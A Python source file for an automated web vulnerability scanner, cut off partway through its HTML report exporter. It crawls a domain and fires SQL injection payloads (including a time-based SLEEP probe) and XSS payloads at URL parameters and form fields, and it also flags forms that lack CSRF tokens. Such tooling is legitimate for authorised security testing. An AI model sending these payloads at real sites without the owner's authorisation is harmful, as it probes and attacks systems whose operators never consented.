"""
Web Security Scanner Engine — OPTIMIZED with Full Page Details
SQL Injection, XSS, CSRF detection with performance tuning
"""

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import re
import time
import json
from typing import List, Dict, Set, Optional, Tuple, Any
from concurrent.futures import ThreadPoolExecutor, as_completed, wait, FIRST_COMPLETED
from colorama import Fore, Style, init
from dataclasses import dataclass, field, asdict
import datetime

init(autoreset=True)


@dataclass
class Vulnerability:
    type: str
    url: str
    parameter: str
    payload: str
    severity: str
    description: str
    evidence: str = ""
    remediation: str = ""


@dataclass
class PageInfo:
    """Detailed information about a crawled page."""
    url: str
    title: str = ""
    status_code: int = 0
    content_type: str = ""
    content_length: int = 0
    forms: List[Dict] = field(default_factory=list)
    internal_links: List[str] = field(default_factory=list)
    external_links: List[str] = field(default_factory=list)
    parameters: List[str] = field(default_factory=list)
    scripts: List[str] = field(default_factory=list)
    tech_stack: List[str] = field(default_factory=list)  # Detected technologies


@dataclass
class FormDetail:
    """Detailed form information."""
    page_url: str
    action_url: str
    method: str
    inputs: List[Dict] = field(default_factory=list)
    has_csrf_token: bool = False
    detected_csrf_field: str = ""


@dataclass
class ScanResult:
    target_url: str
    scan_date: str
    total_urls_scanned: int
    total_forms_found: int
    vulnerabilities: List[Vulnerability] = field(default_factory=list)
    pages: List[PageInfo] = field(default_factory=list)  # All page details
    forms: List[FormDetail] = field(default_factory=list)  # All form details
    scan_duration_seconds: float = 0.0

    def to_dict(self) -> dict:
        return {
            "target_url": self.target_url,
            "scan_date": self.scan_date,
            "total_urls_scanned": self.total_urls_scanned,
            "total_forms_found": self.total_forms_found,
            "vulnerabilities": [asdict(v) for v in self.vulnerabilities],
            "pages": [asdict(p) for p in self.pages],
            "forms": [asdict(f) for f in self.forms],
            "scan_duration_seconds": self.scan_duration_seconds,
        }


class WebScanner:
    """Optimized web security scanner with full page/form details."""

    # ===== SQL INJECTION ERROR PATTERNS (TIGHTENED) =====
    SQL_ERROR_PATTERNS = [
        r"Syntax error or access violation.*\d{5}",
        r"Table '.*?' doesn't exist",
        r"Unknown column '.*?' in 'field list'",
        r"You have an error in your SQL syntax.*near",
        r"Column count doesn't match value count",
        r"Duplicate entry '.*?' for key",
        r"SQLSTATE\[42000\]",
        r"SQLSTATE\[23000\]",
        r"SQLSTATE\[42S02\]",
        r"Uncaught.*PDOException.*SQL",
        r"Uncaught.*mysqli_sql_exception",
        r"Unclosed quotation mark after the character string",
        r"Incorrect syntax near '",
        r"Msg \d+, Level \d+, State \d+",
        r"ERROR:\s+relation\s+\".*?\"\s+does not exist",
        r"ERROR:\s+column\s+\".*?\"\s+does not exist",
        r"ORA-\d{5}:",
        r"supplied argument is not a valid MySQL result resource",
        r"mysql_fetch_array\(\): supplied argument is not a valid",
        r"Division by zero in.*SQL",
    ]

    # ===== SQL INJECTION PAYLOADS (REDUCED, HIGHEST YIELD) =====
    SQLI_PAYLOADS = [
        "'",
        "' OR '1'='1",
        "' OR 1=1 --",
        "' UNION SELECT NULL--",
        "' AND 1=1 --",
        "1' AND '1'='1",
        '" OR "1"="1',
        "' OR SLEEP(3)--",
    ]

    # ===== XSS PAYLOADS (REDUCED, HIGH COVERAGE) =====
    XSS_PAYLOADS = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<details open ontoggle=alert(1)>",
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "';alert(1);//",
        "\" autofocus onfocus=alert(1) x=\"",
    ]

    # ===== TECHNOLOGY DETECTION PATTERNS =====
    TECH_PATTERNS = {
        "PHP": [r"<\?php", r"\.php", r"PHP/[\d.]+", r"X-Powered-By:\s*PHP"],
        "ASP.NET": [r"__VIEWSTATE", r"__EVENTVALIDATION", r"ASP\.NET", r"X-AspNet-Version"],
        "Java": [r"javax\.faces", r"JSF", r"\.jsp", r"X-Powered-By:\s*Servlet"],
        "WordPress": [r"wp-content", r"wp-includes", r"wp-admin", r"WordPress"],
        "Drupal": [r"Drupal\.", r"drupal", r"sites/default/files"],
        "Joomla": [r"com_content", r"option=com_", r"/components/com_"],
        "Laravel": [r"laravel", r"CSRF-TOKEN", r"XSRF-TOKEN"],
        "Django": [r"csrfmiddlewaretoken", r"__csrf", r"Django"],
        "Ruby on Rails": [r"authenticity_token", r"rails", r"Rails"],
        "Express/Node": [r"X-Powered-By:\s*Express", r"node_modules"],
        "jQuery": [r"jquery", r"jQuery", r"\$\.ajax"],
        "React": [r"react", r"ReactDOM", r"createElement"],
        "Angular": [r"ng-app", r"angular", r"ng-model"],
        "Bootstrap": [r"bootstrap", r"Bootstrap"],
    }

    # ===== SKIP THESE TRACKING PARAMS =====
    SKIP_PARAMS = {
        "utm_source", "utm_medium", "utm_campaign", "utm_term",
        "utm_content", "ref", "source", "source_url", "fbclid",
        "gclid", "_ga", "icid", "trk", "affiliate", "tap_s",
        "si", "pk_source", "pk_medium", "pk_campaign",
    }

    # ===== CSRF FIELD PATTERNS =====
    CSRF_PATTERNS = [
        "csrf", "csrf_token", "csrftoken", "csrfmiddlewaretoken",
        "_csrf", "csrf-token", "__csrf", "xsrf", "_xsrf",
        "authenticity_token", "_token", "nonce",
        "__RequestVerificationToken", "_csrf_token",
    ]

    def __init__(
        self,
        target_url: str,
        max_depth: int = 2,
        threads: int = 10,
        timeout: int = 10,
        skip_time_based: bool = False,
        user_agent: str = (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/120.0.0.0 Safari/537.36"
        ),
    ):
        self.target_url = target_url.rstrip("/")
        self.max_depth = max_depth
        self.threads = threads
        self.timeout = timeout
        self.skip_time_based = skip_time_based
        self.visited_urls: Set[str] = set()
        self.forms_found: List[Dict] = []
        self.vulnerabilities: List[Vulnerability] = []
        self.pages: List[PageInfo] = []  # Store all page info
        self.form_details: List[FormDetail] = []  # Store all form details
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
        })
        self.session.verify = False
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        parsed = urlparse(target_url)
        self.target_domain = parsed.netloc
        self.target_scheme = parsed.scheme

        print(f"{Fore.CYAN}[*] Web Security Scanner initialized")
        print(f"{Fore.CYAN}[*] Target: {target_url}")
        print(f"{Fore.CYAN}[*] Max Depth: {max_depth} | Threads: {threads}")
        print(f"{Fore.CYAN}[*] Time-based SQLi: {'DISABLED' if skip_time_based else 'ENABLED'}")
        print(f"{Fore.CYAN}[*] Domain scope: {self.target_domain}\n")

    def _normalize_url(self, url: str) -> str:
        parsed = urlparse(url)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}".rstrip("/")

    def _is_in_scope(self, url: str) -> bool:
        try:
            parsed = urlparse(url)
            return parsed.netloc == self.target_domain or \
                   parsed.netloc.endswith("." + self.target_domain)
        except:
            return False

    def _detect_technologies(self, html: str, headers: Dict) -> List[str]:
        """Detect technologies used by the target."""
        tech_stack = set()
        
        # Check headers
        for key, value in headers.items():
            for tech, patterns in self.TECH_PATTERNS.items():
                for pattern in patterns:
                    if pattern.startswith("X-"):
                        # Header-based detection
                        try:
                            if re.search(pattern, f"{key}: {value}", re.IGNORECASE):
                                tech_stack.add(tech)
                        except:
                            pass
        
        # Check HTML content
        for tech, patterns in self.TECH_PATTERNS.items():
            for pattern in patterns:
                if not pattern.startswith("X-"):
                    try:
                        if re.search(pattern, html, re.IGNORECASE):
                            tech_stack.add(tech)
                    except:
                        pass
        
        return list(tech_stack)

    def _extract_page_info(self, url: str, response: requests.Response) -> PageInfo:
        """Extract comprehensive page information."""
        html = response.text
        soup = BeautifulSoup(html, "html.parser")
        
        # Extract title
        title = ""
        title_tag = soup.find("title")
        if title_tag:
            title = title_tag.get_text(strip=True)
        
        # Extract scripts
        scripts = []
        for script in soup.find_all("script"):
            src = script.get("src", "")
            if src:
                scripts.append(urljoin(url, src))
            elif script.string:
                # Just note inline script presence
                scripts.append("INLINE_SCRIPT")
        
        # Extract links
        internal_links = []
        external_links = []
        for link in soup.find_all("a", href=True):
            href = link["href"].strip()
            full_url = urljoin(url, href)
            if full_url.startswith(("http://", "https://")):
                if self._is_in_scope(full_url):
                    internal_links.append(full_url)
                else:
                    external_links.append(full_url)
        
        # Extract URL parameters
        params = []
        parsed = urlparse(url)
        if parsed.query:
            params = list(parse_qs(parsed.query).keys())
        
        # Detect technologies
        tech_stack = self._detect_technologies(html, dict(response.headers))
        
        return PageInfo(
            url=url,
            title=title,
            status_code=response.status_code,
            content_type=response.headers.get("Content-Type", ""),
            content_length=len(response.content),
            forms=[],  # Will be populated separately
            internal_links=internal_links[:50],  # Limit to prevent huge results
            external_links=external_links[:20],
            parameters=params,
            scripts=scripts[:20],
            tech_stack=tech_stack,
        )

    def _extract_forms_detailed(self, url: str, html: str) -> Tuple[List[Dict], List[FormDetail]]:
        """Extract forms with detailed information."""
        forms = []
        detailed_forms = []
        soup = BeautifulSoup(html, "html.parser")

        for form in soup.find_all("form"):
            form_data = {
                "url": url,
                "method": form.get("method", "get").lower(),
                "action": form.get("action", ""),
                "inputs": [],
            }

            action = form.get("action", "")
            form_data["action_url"] = urljoin(url, action) if action else url

            for input_tag in form.find_all(["input", "textarea", "select"]):
                input_name = input_tag.get("name", "")
                if input_name:
                    input_info = {
                        "name": input_name,
                        "type": input_tag.get("type", "text").lower(),
                        "value": input_tag.get("value", ""),
                        "placeholder": input_tag.get("placeholder", ""),
                        "required": input_tag.has_attr("required"),
                        "maxlength": input_tag.get("maxlength", ""),
                        "minlength": input_tag.get("minlength", ""),
                        "pattern": input_tag.get("pattern", ""),
                    }
                    form_data["inputs"].append(input_info)

            if form_data["inputs"]:
                forms.append(form_data)
                
                # Check for CSRF tokens
                has_csrf = False
                csrf_field = ""
                for inp in form_data["inputs"]:
                    name_lower = inp["name"].lower()
                    for pattern in self.CSRF_PATTERNS:
                        if pattern in name_lower:
                            has_csrf = True
                            csrf_field = inp["name"]
                            break
                    if has_csrf:
                        break
                
                detailed_forms.append(FormDetail(
                    page_url=url,
                    action_url=form_data["action_url"],
                    method=form_data["method"],
                    inputs=form_data["inputs"],
                    has_csrf_token=has_csrf,
                    detected_csrf_field=csrf_field,
                ))

        return forms, detailed_forms

    def _crawl_page(self, url: str, depth: int) -> Tuple[List[str], Optional[PageInfo]]:
        """Crawl and return (new_urls, page_info)."""
        if depth > self.max_depth:
            return [], None

        normalized = self._normalize_url(url)
        if normalized in self.visited_urls:
            return [], None

        self.visited_urls.add(normalized)
        found_urls = []
        page_info = None

        try:
            print(f"{Fore.BLUE}[*] Crawling: {url} (depth: {depth})")
            response = self.session.get(url, timeout=self.timeout)
            
            html = response.text
            
            # Extract page info
            page_info = self._extract_page_info(url, response)
            
            # Extract forms
            forms, detailed_forms = self._extract_forms_detailed(url, html)
            self.forms_found.extend(forms)
            self.form_details.extend(detailed_forms)
            page_info.forms = forms
            
            # Store page info
            self.pages.append(page_info)

            # Extract links
            soup = BeautifulSoup(html, "html.parser")
            for link in soup.find_all("a", href=True):
                href = link["href"].strip()
                full_url = urljoin(url, href)
                if full_url.startswith(("http://", "https://")):
                    if self._is_in_scope(full_url):
                        norm = self._normalize_url(full_url)
                        if norm not in self.visited_urls:
                            found_urls.append(full_url)

        except requests.exceptions.RequestException:
            pass
        except Exception:
            pass

        return found_urls, page_info

    def crawl(self) -> None:
        """Multi-threaded crawl with page info extraction."""
        print(f"{Fore.CYAN}[*] Starting crawl on {self.target_url}")
        to_visit = [(self.target_url, 0)]
        start_time = time.time()

        while to_visit:
            batch = []
            current_depth = to_visit[0][1]

            while to_visit and to_visit[0][1] == current_depth:
                batch.append(to_visit.pop(0))
                if len(batch) >= self.threads * 2:
                    break

            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = {
                    executor.submit(self._crawl_page, url, d): (url, d)
                    for url, d in batch
                }
                for future in as_completed(futures):
                    try:
                        new_urls, page_info = future.result()
                        for new_url in new_urls:
                            to_visit.append((new_url, current_depth + 1))
                    except Exception:
                        pass

        elapsed = time.time() - start_time
        print(f"\n{Fore.GREEN}[✓] Crawl complete!")
        print(f"{Fore.GREEN}[✓] URLs scanned: {len(self.visited_urls)}")
        print(f"{Fore.GREEN}[✓] Forms found: {len(self.forms_found)}")
        print(f"{Fore.GREEN}[✓] Pages documented: {len(self.pages)}")
        print(f"{Fore.GREEN}[✓] Time: {elapsed:.2f}s\n")

    def _print_page_summary(self) -> None:
        """Print a summary of all discovered pages."""
        print(f"\n{Fore.CYAN}[+] Discovered Pages Summary:")
        print(f"{'='*60}")
        
        for i, page in enumerate(self.pages, 1):
            print(f"\n{Fore.WHITE}[{i}] {Fore.YELLOW}{page.url}")
            print(f"    {Fore.CYAN}Title: {Fore.WHITE}{page.title[:80] if page.title else 'N/A'}")
            print(f"    {Fore.CYAN}Status: {Fore.WHITE}{page.status_code} | "
                  f"Size: {page.content_length:,} bytes")
            print(f"    {Fore.CYAN}Forms: {Fore.WHITE}{len(page.forms)} | "
                  f"Params: {Fore.WHITE}{len(page.parameters)} | "
                  f"Scripts: {Fore.WHITE}{len(page.scripts)}")
            if page.tech_stack:
                print(f"    {Fore.CYAN}Tech: {Fore.WHITE}{', '.join(page.tech_stack)}")
            if page.parameters:
                print(f"    {Fore.CYAN}Parameters: {Fore.WHITE}{', '.join(page.parameters[:10])}")

    def _print_form_summary(self) -> None:
        """Print a summary of all discovered forms."""
        print(f"\n{Fore.CYAN}[+] Discovered Forms Summary:")
        print(f"{'='*60}")
        
        for i, form in enumerate(self.form_details, 1):
            print(f"\n{Fore.WHITE}[{i}] Page: {Fore.YELLOW}{form.page_url}")
            print(f"    {Fore.CYAN}Action: {Fore.WHITE}{form.action_url}")
            print(f"    {Fore.CYAN}Method: {Fore.WHITE}{form.method.upper()}")
            print(f"    {Fore.CYAN}Fields ({len(form.inputs)}):")
            for inp in form.inputs:
                csrf_tag = f" {Fore.GREEN}[CSRF Token]" if inp["name"] == form.detected_csrf_field else ""
                required_tag = " *" if inp.get("required") else ""
                print(f"      - {inp['name']} ({inp['type']}){required_tag}{csrf_tag}")
            print(f"    {Fore.CYAN}CSRF Protected: {Fore.WHITE}{form.has_csrf_token}")

    # ==================== SQL INJECTION DETECTION ====================

    def _check_sql_error(self, response_text: str) -> Tuple[bool, str]:
        for pattern in self.SQL_ERROR_PATTERNS:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return True, match.group()
        return False, ""

    def _test_error_based_sqli(self, url: str, param: str) -> List[Vulnerability]:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        if param not in params:
            return []
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        for payload in self.SQLI_PAYLOADS:
            try:
                test_params = params.copy()
                test_params[param] = [payload]
                test_url = base_url + "?" + urlencode(test_params, doseq=True)
                response = self.session.get(test_url, timeout=self.timeout)
                is_error, evidence = self._check_sql_error(response.text)

                if is_error:
                    vuln = Vulnerability(
                        type="SQL Injection (Error-based)",
                        url=url, parameter=param, payload=payload[:80],
                        severity="Critical",
                        description=f"Error-based SQL Injection in parameter '{param}'",
                        evidence=f"SQL Error: {evidence[:300]}",
                        remediation="Use parameterized queries / prepared statements.",
                    )
                    print(f"{Fore.RED}[!] Error SQLi FOUND: {url} | param: {param}")
                    return [vuln]
            except Exception:
                continue
        return []

    def _test_time_based_sqli_fast(self, url: str, param: str) -> List[Vulnerability]:
        if self.skip_time_based:
            return []

        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        if param not in params:
            return []
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        test_payloads = [("' OR SLEEP(3)--", "MySQL")]

        for payload, db_type in test_payloads:
            try:
                test_params = params.copy()
                test_params[param] = [payload]

                baseline_start = time.time()
                try:
                    harmless = params.copy()
                    harmless[param] = ["1"]
                    self.session.get(
                        base_url + "?" + urlencode(harmless, doseq=True),
                        timeout=3
                    )
                except:
                    pass
                base_time = time.time() - baseline_start

                if base_time > 1.5:
                    return []

                start = time.time()
                try:
                    self.session.get(
                        base_url + "?" + urlencode(test_params, doseq=True),
                        timeout=1.5
                    )
                    elapsed = time.time() - start
                except requests.exceptions.Timeout:
                    vuln = Vulnerability(
                        type=f"SQL Injection (Time-based Blind - {db_type})",
                        url=url, parameter=param, payload=payload,
                        severity="Critical",
                        description=f"Time-based SQL Injection in parameter '{param}'",
                        evidence="Request timed out",
                        remediation="Use parameterized queries.",
                    )
                    print(f"{Fore.RED}[!] Time-based SQLi FOUND: {url} | param: {param}")
                    return [vuln]
                except Exception:
                    continue

                if elapsed >= 2.5:
                    vuln = Vulnerability(
                        type=f"SQL Injection (Time-based Blind - {db_type})",
                        url=url, parameter=param, payload=payload,
                        severity="Critical",
                        description=f"Time-based SQL Injection in parameter '{param}'",
                        evidence=f"Response time: {elapsed:.2f}s (baseline: {base_time:.2f}s)",
                        remediation="Use parameterized queries.",
                    )
                    print(f"{Fore.RED}[!] Time-based SQLi FOUND: {url} | param: {param}")
                    return [vuln]
            except Exception:
                continue
        return []

    def _test_sqli_get(self, url: str, param: str) -> List[Vulnerability]:
        found = self._test_error_based_sqli(url, param)
        if found:
            return found
        found = self._test_time_based_sqli_fast(url, param)
        return found

    def _test_sqli_post(self, form: Dict) -> List[Vulnerability]:
        found = []
        for input_field in form["inputs"]:
            param = input_field["name"]
            for payload in self.SQLI_PAYLOADS[:3]:
                try:
                    form_data = {}
                    for inp in form["inputs"]:
                        form_data[inp["name"]] = payload if inp["name"] == param else \
                            inp.get("value", "test")

                    if form["method"] == "post":
                        response = self.session.post(
                            form["action_url"], data=form_data, timeout=self.timeout
                        )
                    else:
                        response = self.session.get(
                            form["action_url"], params=form_data, timeout=self.timeout
                        )

                    is_error, evidence = self._check_sql_error(response.text)
                    if is_error:
                        vuln = Vulnerability(
                            type="SQL Injection (Error-based)",
                            url=form["url"], parameter=param, payload=payload[:80],
                            severity="Critical",
                            description=f"Error-based SQL Injection in form field '{param}'",
                            evidence=f"SQL Error: {evidence[:300]}",
                            remediation="Use parameterized queries.",
                        )
                        found.append(vuln)
                        print(f"{Fore.RED}[!] SQLi FOUND (POST): {form['url']} | field: {param}")
                        break
                except Exception:
                    continue
        return found

    # ==================== XSS DETECTION ====================

    def _test_xss_get(self, url: str, param: str) -> List[Vulnerability]:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        if param not in params:
            return []
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        for payload in self.XSS_PAYLOADS:
            try:
                test_params = params.copy()
                test_params[param] = [payload]
                test_url = base_url + "?" + urlencode(test_params, doseq=True)
                response = self.session.get(test_url, timeout=self.timeout)
                resp_text = response.text

                if payload in resp_text:
                    encoded = payload.replace("<", "&lt;").replace(">", "&gt;")
                    if encoded not in resp_text or payload == encoded:
                        vuln = Vulnerability(
                            type="XSS (Reflected)",
                            url=url, parameter=param, payload=payload[:100],
                            severity="High",
                            description=f"Reflected XSS in parameter '{param}'",
                            evidence=f"Payload reflected: {payload[:80]}",
                            remediation="Contextual output encoding. CSP headers.",
                        )
                        print(f"{Fore.RED}[!] XSS FOUND: {url} | param: {param}")
                        return [vuln]

                for keyword in ["<script", "onerror=", "onload=", "onfocus="]:
                    if keyword in payload:
                        idx = resp_text.find(payload[:10])
                        if idx >= 0:
                            surrounding = resp_text[max(0, idx-5):idx+len(payload)+5]
                            if keyword.lower() in surrounding.lower() and \
                               "&lt;" not in surrounding[:len(keyword)+10]:
                                vuln = Vulnerability(
                                    type="XSS (Reflected - Partial)",
                                    url=url, parameter=param, payload=payload[:100],
                                    severity="High",
                                    description=f"Partial reflected XSS in parameter '{param}'",
                                    evidence=f"Keyword '{keyword}' reflected",
                                    remediation="Contextual output encoding.",
                                )
                                print(f"{Fore.RED}[!] XSS FOUND: {url} | param: {param}")
                                return [vuln]
            except Exception:
                continue
        return []

    def _test_xss_post(self, form: Dict) -> List[Vulnerability]:
        found = []
        for input_field in form["inputs"]:
            param = input_field["name"]
            for payload in self.XSS_PAYLOADS[:5]:
                try:
                    form_data = {}
                    for inp in form["inputs"]:
                        form_data[inp["name"]] = payload if inp["name"] == param else \
                            inp.get("value", "test")

                    if form["method"] == "post":
                        response = self.session.post(
                            form["action_url"], data=form_data, timeout=self.timeout
                        )
                    else:
                        response = self.session.get(
                            form["action_url"], params=form_data, timeout=self.timeout
                        )

                    if payload in response.text:
                        vuln = Vulnerability(
                            type="XSS (Reflected)",
                            url=form["url"], parameter=param, payload=payload[:100],
                            severity="High",
                            description=f"Reflected XSS in form field '{param}'",
                            evidence="Payload reflected in response",
                            remediation="Contextual output encoding.",
                        )
                        found.append(vuln)
                        print(f"{Fore.RED}[!] XSS FOUND (POST): {form['url']} | field: {param}")
                        break
                except Exception:
                    continue
        return found

    # ==================== CSRF DETECTION ====================

    def _test_csrf(self, form: Dict) -> List[Vulnerability]:
        found = []
        if form["method"] not in ("post", "put", "delete"):
            return []

        has_csrf_token = False
        for inp in form["inputs"]:
            name_lower = inp["name"].lower()
            if any(p in name_lower for p in self.CSRF_PATTERNS):
                has_csrf_token = True
                break

        if not has_csrf_token:
            vuln = Vulnerability(
                type="CSRF (Potential)",
                url=form["url"],
                parameter="N/A (form-level)",
                payload="Cross-Site Request Forgery",
                severity="Medium",
                description=f"Potential CSRF — no token in {form['method'].upper()} form",
                evidence=f"Form action: {form.get('action_url', 'N/A')}",
                remediation="Implement CSRF tokens. Use SameSite cookies.",
            )
            found.append(vuln)
            print(f"{Fore.YELLOW}[!] CSRF (Potential): {form['url']}")
        return found

    # ==================== MAIN SCAN ====================

    def _scan_url_batch(self, urls: List[str]) -> None:
        """Scan a batch of URLs in parallel."""
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            sqli_futures = []
            xss_futures = []

            for url in urls:
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                for param in params:
                    if param.lower() in self.SKIP_PARAMS:
                        continue
                    sqli_futures.append(
                        executor.submit(self._test_sqli_get, url, param)
                    )
                    xss_futures.append(
                        executor.submit(self._test_xss_get, url, param)
                    )

            for future in as_completed(sqli_futures + xss_futures):
                try:
                    results = future.result()
                    self.vulnerabilities.extend(results)
                except Exception:
                    pass

    def scan(self) -> ScanResult:
        start_time = time.time()
        scan_date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        print(f"\n{'='*60}")
        print(f"{Fore.CYAN}  Web Security Scanner — Full Scan with Page Details")
        print(f"{Fore.CYAN}  Target: {self.target_url}")
        print(f"{Fore.CYAN}  Started: {scan_date}")
        print(f"{'='*60}\n")

        # Phase 1: Crawl with page details
        print(f"{Fore.MAGENTA}[+] Phase 1/5: Automated Crawling & Page Analysis")
        self.crawl()
        
        # Print page and form summaries
        self._print_page_summary()
        self._print_form_summary()

        # Phase 2: SQLi + XSS on GET params
        print(f"\n{Fore.MAGENTA}[+] Phase 2-3/5: SQLi & XSS Detection (GET parameters)")
        url_list = list(self.visited_urls)
        self._scan_url_batch(url_list)

        sqli_count = sum(1 for v in self.vulnerabilities if "SQL" in v.type)
        xss_count = sum(1 for v in self.vulnerabilities if "XSS" in v.type)
        print(f"{Fore.GREEN}[✓] GET scan complete — SQLi: {sqli_count}, XSS: {xss_count}")

        # Phase 3: SQLi + XSS on POST forms
        print(f"\n{Fore.MAGENTA}[+] Phase 3b/5: SQLi & XSS Detection (POST forms)")
        for form in self.forms_found:
            self.vulnerabilities.extend(self._test_sqli_post(form))
            self.vulnerabilities.extend(self._test_xss_post(form))

        sqli_count = sum(1 for v in self.vulnerabilities if "SQL" in v.type)
        xss_count = sum(1 for v in self.vulnerabilities if "XSS" in v.type)
        print(f"{Fore.GREEN}[✓] POST scan complete — SQLi: {sqli_count}, XSS: {xss_count}")

        # Phase 4: CSRF
        print(f"\n{Fore.MAGENTA}[+] Phase 4/5: CSRF Testing")
        csrf_count = 0
        for form in self.forms_found:
            results = self._test_csrf(form)
            self.vulnerabilities.extend(results)
            csrf_count += len(results)
        print(f"{Fore.GREEN if csrf_count == 0 else Fore.YELLOW}"
              f"[✓] CSRF checks: {csrf_count} potential issues")

        # Phase 5: Generate detailed report
        print(f"\n{Fore.MAGENTA}[+] Phase 5/5: Generating Detailed Report")

        # Summary
        elapsed = time.time() - start_time
        sqli_count = sum(1 for v in self.vulnerabilities if "SQL" in v.type)
        xss_count = sum(1 for v in self.vulnerabilities if "XSS" in v.type)
        csrf_count = sum(1 for v in self.vulnerabilities if "CSRF" in v.type)

        print(f"\n{'='*60}")
        print(f"{Fore.CYAN}  SCAN COMPLETE — DETAILED REPORT")
        print(f"{'='*60}")
        print(f"\n{Fore.WHITE}  Target:              {self.target_url}")
        print(f"  Scan Date:           {scan_date}")
        print(f"  Duration:            {elapsed:.2f}s")
        print(f"\n{Fore.CYAN}  ── CRAWL RESULTS ──")
        print(f"  URLs crawled:        {len(self.visited_urls)}")
        print(f"  Pages documented:    {len(self.pages)}")
        print(f"  Forms found:         {len(self.forms_found)}")
        print(f"  Form details:        {len(self.form_details)}")
        print(f"\n{Fore.CYAN}  ── VULNERABILITIES ──")
        print(f"  Total:               {len(self.vulnerabilities)}")
        print(f"    ├─ SQL Injection:   {sqli_count}")
        print(f"    ├─ XSS:             {xss_count}")
        print(f"    └─ CSRF:            {csrf_count}")
        
        # Print detected technologies
        all_tech = set()
        for page in self.pages:
            all_tech.update(page.tech_stack)
        if all_tech:
            print(f"\n{Fore.CYAN}  ── DETECTED TECHNOLOGIES ──")
            print(f"  {', '.join(sorted(all_tech))}")
        
        print(f"{'='*60}\n")

        result = ScanResult(
            target_url=self.target_url,
            scan_date=scan_date,
            total_urls_scanned=len(self.visited_urls),
            total_forms_found=len(self.forms_found),
            vulnerabilities=self.vulnerabilities,
            pages=self.pages,
            forms=self.form_details,
            scan_duration_seconds=elapsed,
        )

        return result


# ==================== ADDITIONAL UTILITY FUNCTIONS ====================

def print_vulnerability_details(result: ScanResult) -> None:
    """Print detailed vulnerability information."""
    if not result.vulnerabilities:
        print(f"{Fore.GREEN}[✓] No vulnerabilities found!")
        return
    
    print(f"\n{Fore.RED}[!] Vulnerability Details:")
    print("=" * 60)
    
    for i, vuln in enumerate(result.vulnerabilities, 1):
        severity_color = {
            "Critical": Fore.RED,
            "High": Fore.YELLOW,
            "Medium": Fore.BLUE,
            "Low": Fore.WHITE,
        }.get(vuln.severity, Fore.WHITE)
        
        print(f"\n{Fore.WHITE}[{i}] {severity_color}{vuln.type} ({vuln.severity})")
        print(f"    {Fore.CYAN}URL:       {Fore.WHITE}{vuln.url}")
        print(f"    {Fore.CYAN}Parameter: {Fore.WHITE}{vuln.parameter}")
        print(f"    {Fore.CYAN}Payload:   {Fore.WHITE}{vuln.payload}")
        print(f"    {Fore.CYAN}Evidence:  {Fore.WHITE}{vuln.evidence[:150]}")
        print(f"    {Fore.CYAN}Fix:       {Fore.WHITE}{vuln.remediation[:100]}")


def export_results_to_json(result: ScanResult, filename: str = "scan_results.json") -> None:
    """Export scan results to JSON file."""
    with open(filename, "w", encoding="utf-8") as f:
        json.dump(result.to_dict(), f, indent=2, ensure_ascii=False)
    print(f"{Fore.GREEN}[✓] Results exported to {filename}")


def export_results_to_html(result: ScanResult, filename: str = "scan_report.html") -> None:
    """Export scan results to a readable HTML report."""
    html = """<!DOCTYPE html>
<html>
<head>
    <title>Web Security Scan Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #1a1a2e; color: #eee; }
        h1, h2, h3 { color: #e94560; }
        .container { max-width: 1200px; margin: auto; }
        .page-box { background: #16213e; padding: 15px; margin: 10px 0; border-radius: 5px; }
        .vuln-critical { border-left: 5px solid #ff0000; padding-left: 10px; }
        .vuln-high { border-left: 5px solid #ff6600; padding-left: 10px; }
        .vuln-medium { border-left: 5px solid #ffcc00; padding-left: 10px; }
        .vuln-low { border-left: 5px solid #00cc00; padding-left: 10px; }
        table { width: 100%; border-collapse: collapse; margin: 10px 0; }
        th, td { padding: 8px; text-align: left; border-bottom: 1px solid #333; }
        th { background: #0f3460; }
        .badge { display: inline-block; padding: 3px 8px; border-radius: 3px; font-size: 12px; }
        .badge-critical { background: #ff0000; }
        .badge-high { background: #ff6600; }
        .badge-medium { background: #ffcc00; color: #000; }
        .badge-low { background: #00cc00; color: #000; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Web Security Scan Report</h1>
        <p>Target: <strong>%s</strong></p>
        <p>Date: %s</p>
        <p>Duration: %.2f seconds</p>
        
        <h2>Summary</h2>
        <table>
            <tr><th>Metric</th><th>Value</th></tr>
            <tr><td>URLs Scanned</td><td>%d</td></tr>
            <tr><td>Forms Found</td><td>%d</td></tr>
            <tr><td>Total Vulnerabilities</td><td>%d</td></tr>
            <tr><td>SQL Injection</td><td>%d</td></tr>
            <tr><td>XSS</td><td>%d</td></tr>
            <tr><td>CSRF</td><td>%d</td></tr>
        </table>
        
        <h2>Discovered Pages</h2>
        <div class="page-box">
            <table>
                <tr><th>#</th><th>URL</th><th>Title</th><th>Status</th><th>Forms</th><th>Tech</th></tr>
    """
    
    sqli_count = sum(1 for v in result.vulnerabilities if "SQL" in v.type)
    xss_count = sum(1 for v in result.vulnerabilities if "XSS" in v.type)
    csrf_count = sum(1 for v in result.vulnerabilities if "CSRF" in v.type)
    
    html = html % (
        result.target_url,
        result.scan_date,
        result.scan_duration_seconds,
        result.total_urls_scanned,
